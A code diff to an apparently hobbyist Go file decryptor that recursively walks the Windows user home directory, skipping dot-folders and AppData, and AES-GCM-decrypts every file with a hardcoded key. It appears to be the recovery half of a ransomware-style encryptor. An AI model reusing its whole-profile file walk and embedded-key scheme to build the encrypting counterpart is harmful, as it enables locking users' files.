@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"fmt"
 	"io/fs"
 	"os"
 	"os/user"
@@ -22,13 +23,24 @@ func reset_extension(file_path string) string {
 }
 
 func decrypt_file(file_path string) {
-	// read the encrypted file
+	// get file information (including file size)
+	/* file_info, err := os.Stat(file_path)
+	if err != nil {
+		// log.Fatal(err)
+		return
+	}
+	if file_info.Size() < 8 {
+		fmt.Println("Skipping file (too small for decryption):", file_path)
+		return
+	}*/
+
+	// open and read the encrypted file
 	file_contents, err := os.ReadFile(file_path)
 	if err != nil {
 		// log.Fatal(err)
 	}
 
-	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e")
+	secret_key := []byte("4f9a3b7c1d2e8f9a4c3d5b2e6f7a8b9c")
 
 	// create a cipher block based on the secret key
 	block, err := aes.NewCipher(secret_key)
@@ -40,6 +52,12 @@ func decrypt_file(file_path string) {
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		// log.Fatalf("Cipher GCM error: %v", err.Error())
+	}
+
+	// Check if the file has enough data for the nonce and ciphertext
+	if len(file_contents) < gcm.NonceSize() {
+		fmt.Println("File is too small to contain a valid nonce:", file_path)
+		return
 	}
 
 	// decrypt the file contents
@@ -69,13 +87,21 @@ func decrypt_file(file_path string) {
 }
 
 func explore_directory(parent_dir string) {
-	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
-		if !file.IsDir() { // it's a file, not a directory
-			decrypt_file(path)
-		} else { // don't decrypt the folder (but the files inside, see the if block)
-			// nothing
+	err := filepath.WalkDir(parent_dir, func(file_path string, element fs.DirEntry, err error) error {
+		if element.IsDir() { // it's a folder element, not a file element
+			if strings.HasPrefix(element.Name(), ".") { // skip folders with .
+				fmt.Println("Skipping directory:", file_path)
+				return filepath.SkipDir
+			}
+			if strings.HasPrefix(element.Name(), "AppData") { // skip AppData folder
+				fmt.Println("Skipping directory:", file_path)
+				return filepath.SkipDir
+			}
+			// other directories
+			fmt.Println("Exploring directory:", file_path)
+		} else { // it's a file
+			decrypt_file(file_path)
 		}
-
 		return nil
 	})
 
@@ -90,10 +116,8 @@ func osWindows() {
 		// log.Fatal(err)
 	}
 
-	var user_dir string = current_user.HomeDir           // user path: C:\Users\this_user
-	if _, err := os.Stat(user_dir); os.IsNotExist(err) { // check if the directory exists
-		// log.Fatalf("Directory %s doesn't exist, check the code please :)", user_dir)
-	}
+	var user_dir string = current_user.HomeDir // user path: C:\Users\this_user
+	// if _, err := os.Stat(user_dir); os.IsNotExist(err) { log.Fatalf("Directory %s doesn't exist: ", user_dir) } // check if the directory exists
 	explore_directory(user_dir)
 }
 
